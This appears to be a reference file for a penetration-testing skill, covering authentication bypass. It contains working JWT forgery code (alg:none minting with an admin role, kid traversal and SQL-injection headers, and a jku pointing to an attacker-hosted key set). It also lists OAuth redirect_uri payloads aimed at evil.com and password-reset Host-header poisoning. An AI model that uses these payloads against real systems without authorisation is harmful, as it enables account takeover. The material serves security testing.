# Auth Bypass — Deep Workflows

Companion to SKILL.md. JWT decision tree, OAuth flaw matrix, sessions.

## JWT attack decision tree (run in order)

```bash
TOKEN="eyJ..."   # capture from target

# 1. Decode and inspect header/payload
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq .
# Note: alg, kid, jku, x5u fields.

# 2. alg:none family
python3 - <<'EOF'
import base64,json
h={"alg":"none","typ":"JWT"}
p=json.loads(base64.urlsafe_b64decode(TOKEN.split('.')[1]+'=='))
print(base64.urlsafe_b64encode(json.dumps(h).encode()).rstrip(b'=') + b'.' +
      base64.urlsafe_b64encode(json.dumps({**p,'role':'admin'}).encode()).rstrip(b'=') + b'.')
EOF
# Replay minted token; 200 = critical.

# 3. RS256 -> HS256 confusion (sign payload with PUBLIC key as HMAC secret)
hashcat -m 16500 jwt.txt -a 3 ?u?l?l?l?l?l?l?    # weak HMAC brute first
# If server verifies HS256 using pub key file as secret -> forge admin token.

# 4. kid path traversal / injection
{"alg":"HS256","kid":"../../dev/null"}           # empty-key signing
{"alg":"HS256","kid":"x'} UNION SELECT 'secret'-- "}

# 5. jku/x5u external key injection
# Host attacker JWK set; point header jku=https://attacker/jwks.json
```

## OAuth 2.0 flaw matrix

```text
redirect_uri bypass patterns to test (one per attempt):
  https://app.target.com/callback.evil.com
  https://app.target.com@evil.com/callback
  https://evil.com?target.com
  https://target.com.cb.evil.com/
  //evil.com  /\/evil.com  open-redirect chained via target's own redirector
state missing            -> login CSRF: bind victim to attacker session
code substitution        -> complete flow with VICTIM code in ATTACKER client
                          (pre-account takeover class) — verify email binding!
PKCE absent              -> note as hardening gap only with code interception demo
token in fragment on API -> referer leak scenario
scope escalation         -> request broader scope during refresh grant
```

### Account pre-takeover via OAuth (high-value pattern)

```text
1. Victim signs up with email X via password (unverified).
2. Attacker completes OAuth signup claiming email X (provider-verified).
3. App links identities by email without re-verification.
Proof requires two accounts YOU control with a domain you own.
```

## Session management checks

```text
- Logout invalidates server-side? Replay old cookie after logout.
- Password change kills sessions? Old session after change.
- Session fixation: can attacker SET the victim's session id pre-login?
- Cookie flags: Secure HttpOnly SameSite absent?
- Parallel sessions limit enforced?
```

## Password-reset flow abuse matrix

```text
Host header poisoning:   Host: evil.com in reset POST -> link to evil.com
Token reuse:             reset twice with same token
Token not bound:         token from account A resets account B (rare but gold)
Predictable tokens:      timestamp-based generation diffing
Response disclosure:     reset endpoint reveals whether email exists
```

## False-positive elimination

1. Forged-token success: verify TWICE with fresh forgeries + confirm
   privileged action actually permitted.
2. OAuth redirect bypass must land code in YOUR log, not just differ.
3. Pre-takeover claims require end-to-end demo with your own domains.
